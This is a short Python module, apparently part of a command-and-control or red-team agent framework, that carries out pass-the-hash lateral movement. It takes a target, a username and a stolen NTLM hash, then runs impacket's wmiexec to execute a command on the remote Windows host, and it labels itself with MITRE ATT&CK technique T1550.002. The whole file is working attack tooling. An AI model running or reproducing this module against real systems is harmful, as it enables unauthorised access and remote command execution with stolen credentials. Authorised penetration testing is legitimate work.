"""
Agent pass-the-hash module — authenticates to a remote host using an NTLM hash.
T1550.002: Use Alternate Auth Material: Pass the Hash
"""
from __future__ import annotations

import subprocess


def run(task: dict) -> str:
    target   = task.get("target", "")
    username = task.get("username", "")
    nt_hash  = task.get("hash", "")
    command  = task.get("command", "whoami")
    if not (target and username and nt_hash):
        return "missing target, username or hash"
    # impacket wmiexec via subprocess (impacket must be available on target)
    result = subprocess.run(
        ["python", "-m", "impacket.examples.wmiexec",
         f"{username}@{target}", "-hashes", f":{nt_hash}", command],
        capture_output=True, text=True, timeout=30,
    )
    return (result.stdout + result.stderr).strip()
